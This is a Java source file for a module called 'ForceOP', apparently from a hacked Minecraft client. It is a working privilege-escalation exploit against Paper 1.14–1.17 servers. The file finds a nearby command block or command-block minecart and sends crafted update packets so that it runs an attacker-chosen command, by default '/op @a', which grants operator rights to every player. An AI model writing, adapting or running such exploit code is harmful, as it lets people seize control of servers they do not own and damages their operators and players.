/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.exploit;

import net.minecraft.client.util.math.MatrixStack;
import net.shadow.client.feature.config.BooleanSetting;
import net.shadow.client.feature.config.StringSetting;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.minecraft.block.Blocks;
import net.minecraft.block.entity.CommandBlockBlockEntity;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.CommandBlockMinecartEntity;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockMinecartC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;

public class ForceOP extends Module {

    final StringSetting command = this.config.create(new StringSetting.Builder("/op @a").name("Command").description("The command to run while using the exploit").get());
    final BooleanSetting useBlock = this.config.create(new BooleanSetting.Builder(false).name("Use Blocks").description("Use commandblocks instead of minecarts to perform the exploit").get());

    public ForceOP() {
        super("ForceOP", "ForceOP on paper 1.14.0 - 1.17.0 Servers while in GMC with command blocks on", ModuleType.EXPLOIT);
    }

    @Override
    public void tick() {

    }

    @Override
    public void enable() {
        if(useBlock.getValue()){
            BlockPos selblock = null;
            for (int x = -7; x < 8; x++)
                for (int y = -7; y < 8; y++)
                    for (int z = -7; z < 8; z++) {
                        BlockPos pos = client.player.getBlockPos().add(new BlockPos(x, y, z));
                        if (client.world.getBlockState(pos).getBlock() == Blocks.COMMAND_BLOCK) {
                            selblock = pos;
                            break;
                        }
                    }
            if(selblock == null){
                Notification.create(5000, "ForceOP", Notification.Type.ERROR, "Place a CommandBlock Near You!");
                return;
            }
            Notification.create(5000, "ForceOP", Notification.Type.SUCCESS, "Performing Exploit...");
            client.player.networkHandler.sendPacket(new UpdateCommandBlockC2SPacket(selblock, "", CommandBlockBlockEntity.Type.REDSTONE, false, false, false));
            client.player.networkHandler.sendPacket(new UpdateCommandBlockC2SPacket(selblock, command.getValue(), CommandBlockBlockEntity.Type.REDSTONE, false, false, true));
            this.setEnabled(false);
        }else{
            int id = 696969;
            for (Entity mcart : client.world.getEntities()) {
                if (mcart instanceof CommandBlockMinecartEntity) {
                    if (mcart.distanceTo(client.player) > 7) return;
                    id = mcart.getId();
                }
            }
            if (id == 696969) {
                Notification.create(5000, "ForceOP", Notification.Type.ERROR, "Place a CommandBlockMinecart Near You!");
                this.setEnabled(false);
                return;
            }
            Notification.create(5000, "ForceOP", Notification.Type.SUCCESS, "Performing Exploit...");
            client.player.networkHandler.sendPacket(new UpdateCommandBlockMinecartC2SPacket(id, command.getValue(), false));
            this.setEnabled(false);
        }
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
